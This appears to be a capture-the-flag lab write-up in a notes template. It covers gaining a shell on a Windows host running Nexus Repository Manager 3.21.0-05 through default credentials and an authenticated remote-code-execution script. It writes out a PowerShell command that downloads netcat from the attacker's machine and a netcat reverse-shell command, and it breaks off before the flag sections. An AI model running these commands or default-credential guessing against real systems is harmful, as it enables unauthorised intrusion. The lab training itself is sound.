[[Active Notes Template]]
## Provided Credentials
---

```

```

```

```

---
## Open Ports

```powershell
21/tcp    open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-cors: HEAD GET POST PUT DELETE TRACE OPTIONS CONNECT PATCH
|_http-title: BaGet
|_http-server-header: Microsoft-IIS/10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
7680/tcp  open  pando-pub?
8081/tcp  open  http          Jetty 9.4.18.v20190429
|_http-server-header: Nexus/3.21.0-05 (OSS)
|_http-title: Nexus Repository Manager
| http-robots.txt: 2 disallowed entries 
|_/repository/ /service/
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
```

8081
80

---
## Software Versions

```powershell
Sonatype Nexus Repository Manager 3.21.0-05
```

---
## Discovered Subdomains

---
## Discovered Credentials

---
## Interesting Files/Paths

---
## Attack Ideas

---
## Steps to User.txt

These queries yield good results:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*XjloHuK4Mh3P7L7k41t4yw.png)

RCE, but authenticated.

If we can find or manufacture some credentials we are likely in.

I use the -m argument to to mirror the python script to my working directory.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*JuU0vFInro42ed-uTt4NEQ.png)

Let’s take a quick peek at it.


Looks rather straight forward. As long as we can get credentials the script will login and execute whatever we have in the CMD variable defined in line 23.

![](https://miro.medium.com/v2/resize:fit:417/1*6ptasxu2R9Gembm0d0PbIw.png)

Replace these variables.

Before we tailor the script, let’s see about those credentials.

I always try admin:admin first to get a view of the the error message. Those creds _actually work_ sometimes.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*evvOCMir-qxID61w7IjNRQ.png)

Not this time.

Next I do a Google search for default passwords.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*JpfFRD6oe25--Qh4WiFNBA.png)

Sources agree that it is admin:admin123 but that doesn’t work. Next I check my own Kali password repository.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*1G4y2FmiuHzYDayWlfabMw.png)

:~D

It returns two specific hits, one we tried already the other is nexus:nexus. This works!

![](https://miro.medium.com/v2/resize:fit:346/1*F36pQ6w5N-0W5rFWNOVkjQ.png)

What luck!

If that had not worked, we would have likely had to use Hydra. I like Hydra but it can be a cumbersome tool to work with especially here where we have to choose BOTH good name and password lists. I only feel comfortable using Hydra when I have at least one of those variables locked down. It’s interesting though so I’ll demonstrate how it could be done if we didn’t get a direct hit with our grep command.

Back to our task at hand. We now have credentials. Let’s plug them into our python script and then figure out the best command to run to get a reverse shell.

![](https://miro.medium.com/v2/resize:fit:358/1*lEpKrSGlTPZ_fvigP2FGyA.png)

What goes here…

This is a windows machine. We have some options. We could use a base64 encoded command that does not require a file to be retrieved from my machine but I shy away from that because it provides a fragile shell. Instead I’m to standup a web server, host netcat, then call it from the victim machine and executing it. This way has a lot of moving pieces but they are easy to work with and we get insight into which parts of the process work and fail (if they fail).

First the we set up a server on Kali:

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*n-aWrLXL-l3PW2lovpyQ3A.png)

Paste this command in the CMD variable of our python script:

CMD='powershell iwr http://192.168.45.154/nc64.exe -outfile nc64.exe'

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*kY4Y-lA1Q8ntyaAPcU8P9A.png)

Run the script.

![](https://miro.medium.com/v2/resize:fit:582/1*n8MG3la1luX7Pz-naMCmgg.png)

Check your python web server. The file was retrieved. This confirms command execution.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*PU2YNqF7unlmDNA2gwP0Hw.png)

Netcat is on the box but we don’t know where. We will try to execute it from the current directory. Change the CMD variable again, save and run it again.

CMD='.\nc64.exe 192.168.45.154 135 -e cmd.exe'

We get an error.

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*C-ErRxJo4d-5L9Urg5Il8w.png)

It looks like it is nested in a lot of functions. Let’s try to escape them. Two backslashes also fails but four succeeds.

![](https://miro.medium.com/v2/resize:fit:585/1*NIWi6BlI81V4mu8ZnUie-w.png)

Press enter or click to view image in full size

![](https://miro.medium.com/v2/resize:fit:700/1*t73wJz9-oStWyByi6Ng_aw.png)

I

---
## Steps to root.txt

---
## User Flag

```

```

## Root Flag

```

```